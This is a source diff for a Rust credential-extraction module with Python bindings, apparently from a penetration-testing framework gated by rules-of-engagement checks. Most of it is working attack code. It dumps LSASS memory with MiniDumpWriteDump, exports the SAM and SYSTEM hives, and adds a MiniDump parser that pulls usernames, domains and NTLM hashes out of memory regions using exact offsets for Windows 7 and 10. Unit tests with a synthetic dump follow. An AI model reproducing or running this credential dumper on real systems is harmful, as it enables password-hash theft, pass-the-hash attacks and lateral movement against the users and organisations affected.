@@ -17,7 +17,7 @@
 use pyo3::exceptions::{PyRuntimeError, PyValueError};
 use pyo3::prelude::*;
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 
 const MAX_ROE_ID_BYTES: usize = 256;
 const MAX_SCOPE_ENTRIES: usize = 10_000;
@@ -88,7 +88,7 @@ impl CredentialExtractor {
     fn extract_from_lsass(
         &self,
         target: Option<&str>,
-        _dump_path: Option<&str>,
+        dump_path: Option<&str>,
     ) -> PyResult<Vec<HashMap<String, String>>> {
         if !self.allow_lsass {
             return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
@@ -162,6 +162,33 @@ impl CredentialExtractor {
         parse_dcc_structure(hash)
     }
 
+    /// Parse an LSASS MiniDump file and extract NTLM credential metadata.
+    ///
+    /// Scans Memory64ListStream regions for the distinctive empty-LM-hash
+    /// sentinel (``aad3b435b51404eeaad3b435b51404ee``) that appears in every
+    /// modern Windows MSV1_0 credential entry.  Resolves adjacent
+    /// UNICODE_STRING pointers to extract ``username``, ``domain``,
+    /// ``nt_hash``, and ``lm_hash`` fields.  No plaintext passwords are
+    /// returned.  Requires ``allow_lsass=True``.
+    ///
+    /// Works against Windows 7/2008 x64 and Windows 10/2016+ x64 layouts;
+    /// older 32-bit or encrypted-credential dumps return an empty list.
+    #[pyo3(signature = (dump_path))]
+    fn parse_dump_file(
+        &self,
+        dump_path: &str,
+    ) -> PyResult<Vec<HashMap<String, String>>> {
+        if !self.allow_lsass {
+            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
+        }
+        if dump_path.is_empty() || dump_path.len() > MAX_PATH_BYTES {
+            return Err(PyErr::new::<PyValueError, _>(
+                "dump_path must be between 1 and 4096 bytes",
+            ));
+        }
+        parse_lsass_dump(dump_path).map_err(|e| PyErr::new::<PyRuntimeError, _>(e))
+    }
+
     fn is_in_scope(&self, host: &str) -> bool {
         self.scope_hosts
             .iter()
@@ -189,20 +216,33 @@ impl CredentialExtractor {
 // ---------------------------------------------------------------------------
 
 #[cfg(windows)]
+#[link(name = "dbghelp")]
+extern "system" {
+    fn MiniDumpWriteDump(
+        hprocess: *mut std::ffi::c_void,
+        processid: u32,
+        hfile: *mut std::ffi::c_void,
+        dumptype: i32,
+        exceptionparam: *const std::ffi::c_void,
+        userstreamparam: *const std::ffi::c_void,
+        callbackparam: *const std::ffi::c_void,
+    ) -> i32;
+}
+
+#[cfg(windows)]
 fn windows_dump_lsass(
     dump_path: Option<&str>,
 ) -> PyResult<Vec<HashMap<String, String>>> {
     use windows_sys::Win32::{
         Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
         Storage::FileSystem::{
-            CreateFileW, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE, OPEN_ALWAYS,
+            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, OPEN_ALWAYS,
         },
         System::{
-            Diagnostics::Debug::{MiniDumpWithFullMemory, MiniDumpWriteDump},
-            ProcessStatus::{EnumProcesses, GetProcessImageFileNameW},
+            Diagnostics::Debug::MiniDumpWithFullMemory,
+            ProcessStatus::GetProcessImageFileNameW,
             Threading::{
-                OpenProcess, PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION,
-                PROCESS_VM_READ,
+                OpenProcess, PROCESS_ALL_ACCESS,
             },
         },
     };
@@ -224,7 +264,7 @@ fn windows_dump_lsass(
 
         // 3. Open LSASS process with full access.
         let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
-        if proc_handle == 0 {
+        if proc_handle.is_null() {
             return Err(PyErr::new::<PyRuntimeError, _>(
                 "OpenProcess(LSASS) failed — check SeDebugPrivilege",
             ));
@@ -233,12 +273,12 @@ fn windows_dump_lsass(
         // 4. Create or overwrite the dump file.
         let file_handle = CreateFileW(
             out_path_wide.as_ptr(),
-            GENERIC_WRITE,
+            FILE_GENERIC_WRITE,
             0,
             std::ptr::null(),
             OPEN_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
-            0,
+            std::ptr::null_mut(),
         );
         if file_handle == INVALID_HANDLE_VALUE {
             CloseHandle(proc_handle);
@@ -309,7 +349,7 @@ unsafe fn find_lsass_pid_windows() -> PyResult<u32> {
             continue;
         }
         let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, *pid);
-        if handle == 0 {
+        if handle.is_null() {
             continue;
         }
         let mut name_buf = vec![0u16; 512];
@@ -335,7 +375,7 @@ unsafe fn find_lsass_pid_windows() -> PyResult<u32> {
 #[cfg(windows)]
 fn windows_export_sam(base_path: &str) -> PyResult<Vec<HashMap<String, String>>> {
     use windows_sys::Win32::{
-        System::Registry::{RegOpenKeyExW, RegSaveKeyExW, HKEY_LOCAL_MACHINE, KEY_READ, REG_STANDARD_FORMAT},
+        System::Registry::{RegOpenKeyExW, RegSaveKeyExW, HKEY, HKEY_LOCAL_MACHINE, KEY_READ, REG_STANDARD_FORMAT},
     };
     use std::os::windows::ffi::OsStrExt;
 
@@ -351,7 +391,7 @@ fn windows_export_sam(base_path: &str) -> PyResult<Vec<HashMap<String, String>>>
 
     unsafe {
         // Open SAM hive
-        let mut sam_key: isize = 0;
+        let mut sam_key: HKEY = std::ptr::null_mut();
         let status = RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
             to_wide_str("SAM").as_ptr(),
@@ -375,7 +415,7 @@ fn windows_export_sam(base_path: &str) -> PyResult<Vec<HashMap<String, String>>>
         }
 
         // Open SYSTEM hive
-        let mut sys_key: isize = 0;
+        let mut sys_key: HKEY = std::ptr::null_mut();
         let status = RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
             to_wide_str("SYSTEM").as_ptr(),
@@ -457,6 +497,265 @@ fn parse_dcc_structure(data: &[u8]) -> PyResult<HashMap<String, String>> {
     }
 
     Ok(info)
+}
+
+// ---------------------------------------------------------------------------
+// MiniDump NTLM parser
+// ---------------------------------------------------------------------------
+
+/// MiniDump signature bytes ("MDMP").
+const MINIDUMP_SIGNATURE: u32 = 0x504d_444d;
+/// Stream type: Memory64ListStream.
+const MEMORY64_LIST_STREAM: u32 = 9;
+/// Empty LM-hash sentinel present in virtually every modern Windows credential.
+const EMPTY_LM_HASH: [u8; 16] = [
+    0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
+    0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
+];
+/// NT hash for an empty password — valid but flagged for annotation.
+const EMPTY_NT_HASH: [u8; 16] = [
+    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31,
+    0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
+];
+const MAX_DUMP_BYTES: usize = 512 * 1024 * 1024; // 512 MiB hard cap
+
+/// Read a little-endian u32 from `buf` at `offset`, or `None` on bounds failure.
+#[inline]
+fn le_u32_at(buf: &[u8], offset: usize) -> Option<u32> {
+    buf.get(offset..offset + 4)
+        .map(|s| u32::from_le_bytes(s.try_into().unwrap()))
+}
+
+/// Read a little-endian u64 from `buf` at `offset`, or `None` on bounds failure.
+#[inline]
+fn le_u64_at(buf: &[u8], offset: usize) -> Option<u64> {
+    buf.get(offset..offset + 8)
+        .map(|s| u64::from_le_bytes(s.try_into().unwrap()))
+}
+
+/// Format 16 bytes as lowercase hex.
+#[inline]
+fn hex16(b: &[u8; 16]) -> String {
+    b.iter().map(|x| format!("{x:02x}")).collect()
+}
+
+/// Return `true` if the 16-byte hash is not a trivially invalid all-zero block.
+#[inline]
+fn plausible_hash(h: &[u8; 16]) -> bool {
+    // All-zero is the uninitialised/missing sentinel — skip it.
+    h.iter().any(|&b| b != 0)
+}
+
+/// Resolve a virtual address to a slice in the dump buffer.
+fn va_to_slice<'a>(
+    dump: &'a [u8],
+    va_map: &[(u64, u64, u64)],
+    va: u64,
+    size: u64,
+) -> Option<&'a [u8]> {
+    for &(start_va, region_size, file_off) in va_map {
+        if va >= start_va && va + size <= start_va + region_size {
+            let file_start = (file_off + (va - start_va)) as usize;
+            let file_end = file_start + size as usize;
+            return dump.get(file_start..file_end);
+        }
+    }
+    None
+}
+
+/// Attempt to decode a UTF-16LE UNICODE_STRING structure (x64 layout).
+///
+/// Layout: Length(2) + MaxLength(2) + Pad(4) + Buffer_VA(8) = 16 bytes.
+/// The Buffer_VA is resolved through `va_map` (VA -> slice into `dump`).
+fn decode_unicode_string(
+    region_buf: &[u8],
+    us_offset: usize,
+    dump: &[u8],
+    va_map: &[(u64, u64, u64)],
+) -> Option<String> {
+    // Need at least 16 bytes for the UNICODE_STRING header.
+    if us_offset + 16 > region_buf.len() {
+        return None;
+    }
+    let length = (region_buf[us_offset] as usize) | ((region_buf[us_offset + 1] as usize) << 8);
+    // length is in bytes; must be even (UTF-16 code units), non-zero, and <= 512
+    if length == 0 || length > 512 || length % 2 != 0 {
+        return None;
+    }
+    let buffer_va = le_u64_at(region_buf, us_offset + 8)?;
+    let slice = va_to_slice(dump, va_map, buffer_va, length as u64)?;
+    let units: Vec<u16> = slice
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    let s = String::from_utf16_lossy(&units);
+    // Accept only printable username/domain characters.
+    if s.chars().all(|c| matches!(c,
+        'A'..='Z' | 'a'..='z' | '0'..='9' | '_' | '-' | '.' | ' ' | '$' | '@'
+    )) {
+        Some(s)
+    } else {
+        None
+    }
+}
+
+/// Parse an LSASS MiniDump file and return NTLM credential metadata.
+///
+/// Algorithm:
+/// 1. Parse the MiniDump header + Memory64ListStream -> VA map.
+/// 2. Scan every memory region for the 16-byte empty-LM-hash sentinel.
+/// 3. Extract: NT hash (lm-16), UserName/Domain UNICODE_STRINGs.
+///    Win7/2008 x64:   UserName at lm-0x60, Domain at lm-0x70.
+///    Win10/2016+ x64: UserName at lm-0x90, Domain at lm-0xa0.
+/// 4. Deduplicate by (username_lower, nt_hash).
+pub fn parse_lsass_dump(dump_path: &str) -> Result<Vec<HashMap<String, String>>, String> {
+    use std::fs;
+    use std::io::Read;
+
+    let mut f = fs::File::open(dump_path)
+        .map_err(|e| format!("Cannot open dump file: {e}"))?;
+    let meta = f.metadata().map_err(|e| format!("Stat failed: {e}"))?;
+    if meta.len() < 32 {
+        return Err("File too small to be a MiniDump".to_string());
+    }
+    if meta.len() > MAX_DUMP_BYTES as u64 {
+        return Err("Dump file exceeds 512 MiB safety cap".to_string());
+    }
+    let mut dump = Vec::with_capacity(meta.len() as usize);
+    f.read_to_end(&mut dump)
+        .map_err(|e| format!("Read failed: {e}"))?;
+
+    // Validate MiniDump header.
+    let sig = le_u32_at(&dump, 0).ok_or("Truncated header")?;
+    if sig != MINIDUMP_SIGNATURE {
+        return Err(format!("Not a MiniDump (signature 0x{sig:08x})"));
+    }
+    let stream_count = le_u32_at(&dump, 8).ok_or("Cannot read stream count")? as usize;
+    let dir_rva = le_u32_at(&dump, 12).ok_or("Cannot read directory RVA")? as usize;
+    if stream_count > 256 {
+        return Err("Implausible stream count".to_string());
+    }
+    let dir_end = dir_rva
+        .checked_add(stream_count * 12)
+        .ok_or("Directory overflow")?;
+    if dir_end > dump.len() {
+        return Err("Directory extends past EOF".to_string());
+    }
+
+    // Locate Memory64ListStream.
+    let mut mem64_rva: Option<usize> = None;
+    for i in 0..stream_count {
+        let base = dir_rva + i * 12;
+        let stream_type = le_u32_at(&dump, base).unwrap_or(0);
+        let rva = le_u32_at(&dump, base + 8).unwrap_or(0) as usize;
+        if stream_type == MEMORY64_LIST_STREAM {
+            mem64_rva = Some(rva);
+            break;
+        }
+    }
+    let m64 = mem64_rva.ok_or("No Memory64ListStream — dump may be partial")?;
+
+    // Parse Memory64List: NumberOfMemoryRanges(8) + BaseRva(8) + [VA(8)+Size(8)]...
+    let range_count = le_u64_at(&dump, m64).ok_or("Cannot read range count")? as usize;
+    let base_rva = le_u64_at(&dump, m64 + 8).ok_or("Cannot read base RVA")? as usize;
+    if range_count > 1_000_000 {
+        return Err("Implausible memory range count".to_string());
+    }
+    let entries_start = m64 + 16;
+    let entries_end = entries_start
+        .checked_add(range_count * 16)
+        .ok_or("Range entries overflow")?;
+    if entries_end > dump.len() {
+        return Err("Range entries extend past EOF".to_string());
+    }
+
+    let mut va_map: Vec<(u64, u64, u64)> = Vec::with_capacity(range_count);
+    let mut file_cursor = base_rva as u64;
+    for i in 0..range_count {
+        let eb = entries_start + i * 16;
+        let start_va = le_u64_at(&dump, eb).unwrap_or(0);
+        let region_size = le_u64_at(&dump, eb + 8).unwrap_or(0);
+        va_map.push((start_va, region_size, file_cursor));
+        file_cursor = file_cursor.saturating_add(region_size);
+    }
+
+    // Scan regions for credential patterns.
+    let mut seen: HashSet<String> = HashSet::new();
+    let mut results: Vec<HashMap<String, String>> = Vec::new();
+
+    for &(start_va, region_size, file_off) in &va_map {
+        let fstart = file_off as usize;
+        let fend = fstart.saturating_add(region_size as usize).min(dump.len());
+        if fstart >= fend || fend - fstart < 16 {
+            continue;
+        }
+        let region = &dump[fstart..fend];
+        let rlen = region.len();
+
+        let mut pos = 0usize;
+        while pos + 16 <= rlen {
+            if region[pos] != EMPTY_LM_HASH[0]
+                || &region[pos..pos + 16] != EMPTY_LM_HASH.as_ref()
+            {
+                pos += 1;
+                continue;
+            }
+            let lm_pos = pos;
+            if lm_pos < 16 {
+                pos += 16;
+                continue;
+            }
+            let nt_start = lm_pos - 16;
+            let nt_bytes: [u8; 16] = region[nt_start..nt_start + 16].try_into().unwrap();
+            if !plausible_hash(&nt_bytes) {
+                pos += 16;
+                continue;
+            }
+
+            // Try Win7 then Win10 UNICODE_STRING offsets.
+            // Region buffer positions are relative to `fstart`.
+            // The Buffer_VA inside each UNICODE_STRING is absolute — resolved via va_map.
+            // We pass the full dump + va_map so va_to_slice can dereference across regions.
+            let region_va_base = start_va.wrapping_add((fstart as u64).wrapping_sub(file_off));
+            let _ = region_va_base; // not needed: region is contiguous in dump
+
+            let mut username = String::new();
+            let mut domain = String::new();
+            for &(name_back, dom_back) in &[(0x60usize, 0x70usize), (0x90usize, 0xa0usize)] {
+                if lm_pos < dom_back + 16 {
+                    continue;
+                }
+                let us_name = lm_pos - name_back;
+                let us_dom  = lm_pos - dom_back;
+                if let Some(u) = decode_unicode_string(region, us_name, &dump, &va_map) {
+                    if !u.is_empty() {
+                        if let Some(d) = decode_unicode_string(region, us_dom, &dump, &va_map) {
+                            username = u;
+                            domain = d;
+                            break;
+                        }
+                    }
+                }
+            }
+
+            let nt_hex = hex16(&nt_bytes);
+            let lm_hex = hex16(&EMPTY_LM_HASH);
+            let dedup = format!("{},{}", username.to_lowercase(), nt_hex);
+            if seen.insert(dedup) {
+                let mut entry: HashMap<String, String> = HashMap::new();
+                entry.insert("username".into(),
+                    if username.is_empty() { "<unknown>".into() } else { username });
+                entry.insert("domain".into(),
+                    if domain.is_empty() { "<unknown>".into() } else { domain });
+                entry.insert("nt_hash".into(), nt_hex);
+                entry.insert("lm_hash".into(), lm_hex);
+                entry.insert("empty_password".into(), (nt_bytes == EMPTY_NT_HASH).to_string());
+                results.push(entry);
+            }
+            pos += 16;
+        }
+    }
+    Ok(results)
 }
 
 // ---------------------------------------------------------------------------
@@ -556,5 +855,169 @@ mod tests {
         assert!(result.is_ok());
         let info = result.unwrap();
         assert_eq!(info.get("hash_field_present").map(|s| s.as_str()), Some("true"));
+    }
+
+    // --- parse_dump_file / parse_lsass_dump tests ---
+
+    #[test]
+    fn test_parse_dump_file_blocked_without_allow_lsass() {
+        let extractor = CredentialExtractor::new(
+            "ROE-TEST".to_string(),
+            Some(vec!["192.168.1.1".to_string()]),
+            false, // allow_lsass = false
+            false,
+        )
+        .expect("Valid CredentialExtractor");
+        let result = extractor.parse_dump_file("C:\\fake.dmp");
+        assert!(result.is_err(), "Must be blocked when allow_lsass=false");
+        let msg = result.unwrap_err().to_string();
+        assert!(msg.contains("not permitted"), "Error message: {msg}");
+    }
+
+    #[test]
+    fn test_parse_dump_file_rejects_bad_signature() {
+        use std::io::Write;
+        let extractor = CredentialExtractor::new(
+            "ROE-TEST".to_string(),
+            None,
+            true, // allow_lsass = true
+            false,
+        )
+        .expect("Valid CredentialExtractor");
+        // Write 64 bytes with a bad signature.
+        let mut tmp = std::env::temp_dir();
+        tmp.push("forge_test_bad_sig.dmp");
+        {
+            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
+            f.write_all(&[0u8; 64]).expect("Write zeros");
+        }
+        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
+        let _ = std::fs::remove_file(&tmp);
+        assert!(result.is_err(), "Bad signature must be rejected");
+        let msg = result.unwrap_err().to_string();
+        assert!(msg.contains("Not a MiniDump") || msg.contains("signature"),
+            "Error message: {msg}");
+    }
+
+    #[test]
+    fn test_parse_dump_file_rejects_too_small() {
+        use std::io::Write;
+        let extractor = CredentialExtractor::new(
+            "ROE-TEST".to_string(),
+            None,
+            true,
+            false,
+        )
+        .expect("Valid CredentialExtractor");
+        let mut tmp = std::env::temp_dir();
+        tmp.push("forge_test_tiny.dmp");
+        {
+            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
+            f.write_all(&[0x4d, 0x44, 0x4d, 0x50]).expect("Write 4 bytes"); // just sig
+        }
+        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
+        let _ = std::fs::remove_file(&tmp);
+        assert!(result.is_err(), "Tiny file must be rejected");
+    }
+
+    #[test]
+    fn test_parse_lsass_dump_synthetic_finds_hash() {
+        // Build a minimal in-memory MiniDump with one Memory64ListStream
+        // and one region containing a synthetic credential structure.
+        //
+        // Layout (all little-endian):
+        //   [0]  Header: sig(4) + ver(4) + stream_count=1(4) + dir_rva=32(4) + ...
+        //   [32] Directory: StreamType=9(4) + DataSize(4) + StreamRva=64(4) = 12 bytes
+        //   [64] Memory64List: NumberOfRanges=1(8) + BaseRva(8) + VA(8) + Size(8)
+        //   [96] Credential region (raw bytes — no UNICODE_STRING pointer, so
+        //        username/domain will be <unknown>, but NT+LM hashes are found).
+        //
+        // The credential region simply contains:
+        //   bytes 0..16  = a non-zero NT hash (fake)
+        //   bytes 16..32 = empty LM hash sentinel
+        //
+        // That gives lm_pos=16, nt_start=0.  Win7 UserName offset = 16-0x60 which
+        // underflows, so username stays <unknown>.  That's fine — we just assert
+        // the NT hash was extracted and returned.
+        let nt_hash: [u8; 16] = [
+            0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+            0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+        ];
+        let lm_hash: [u8; 16] = [
+            0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
+            0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
+        ];
+
+        // Region: 256 bytes, NT hash at offset 0, LM hash at offset 16.
+        let mut region = vec![0u8; 256];
+        region[0..16].copy_from_slice(&nt_hash);
+        region[16..32].copy_from_slice(&lm_hash);
+
+        let region_va: u64 = 0x0000_7fff_0000_0000_u64;
+        let region_size: u64 = region.len() as u64;
+
+        // Memory64List starts at offset 64.
+        // BaseRva points to where region data starts in the file.
+        // Region data will start right after the header+dir+mem64list.
+        // Header = 32 bytes (we'll use first 32), dir at 32 (12 bytes),
+        // mem64list at 64 (16 + 1*16 = 32 bytes), region at 96.
+        let base_rva: u64 = 96;
+
+        let mut dump = vec![0u8; 96 + region.len()];
+
+        // Header (32 bytes):
+        //   sig(4) version(4) stream_count(4) dir_rva(4) + padding(16)
+        let sig = 0x504d_444d_u32.to_le_bytes();
+        dump[0..4].copy_from_slice(&sig);
+        let ver = 0x0000_a793_u32.to_le_bytes();
+        dump[4..8].copy_from_slice(&ver);
+        let stream_count = 1u32.to_le_bytes();
+        dump[8..12].copy_from_slice(&stream_count);
+        let dir_rva_val = 32u32.to_le_bytes();
+        dump[12..16].copy_from_slice(&dir_rva_val);
+
+        // Directory at offset 32 (12 bytes):
+        //   StreamType=9(4) + DataSize=32(4) + StreamRva=64(4)
+        dump[32..36].copy_from_slice(&9u32.to_le_bytes());   // Memory64ListStream
+        dump[36..40].copy_from_slice(&32u32.to_le_bytes());  // DataSize
+        dump[40..44].copy_from_slice(&64u32.to_le_bytes());  // StreamRva
+
+        // Memory64List at offset 64 (32 bytes):
+        //   NumberOfRanges=1(8) + BaseRva=96(8) + [VA(8)+Size(8)]
+        dump[64..72].copy_from_slice(&1u64.to_le_bytes());          // range count
+        dump[72..80].copy_from_slice(&base_rva.to_le_bytes());      // base RVA
+        dump[80..88].copy_from_slice(&region_va.to_le_bytes());     // start VA
+        dump[88..96].copy_from_slice(&region_size.to_le_bytes());   // size
+
+        // Region data at offset 96.
+        dump[96..96 + region.len()].copy_from_slice(&region);
+
+        // Write to a temp file and parse.
+        use std::io::Write;
+        let mut tmp = std::env::temp_dir();
+        tmp.push("forge_test_synthetic.dmp");
+        {
+            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
+            f.write_all(&dump).expect("Write dump");
+        }
+        let extractor = CredentialExtractor::new(
+            "ROE-TEST".to_string(), None, true, false,
+        )
+        .expect("Valid CredentialExtractor");
+        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
+        let _ = std::fs::remove_file(&tmp);
+
+        assert!(result.is_ok(), "Synthetic dump must parse: {:?}", result);
+        let creds = result.unwrap();
+        assert_eq!(creds.len(), 1, "Expected exactly 1 credential");
+        let c = &creds[0];
+        assert_eq!(c.get("nt_hash").map(String::as_str),
+            Some("0123456789abcdef0123456789abcdef"),
+            "NT hash must match");
+        assert_eq!(c.get("lm_hash").map(String::as_str),
+            Some("aad3b435b51404eeaad3b435b51404ee"),
+            "LM hash must be empty-LM sentinel");
+        assert_eq!(c.get("empty_password").map(String::as_str), Some("false"),
+            "Not the empty-NT hash");
     }
 }
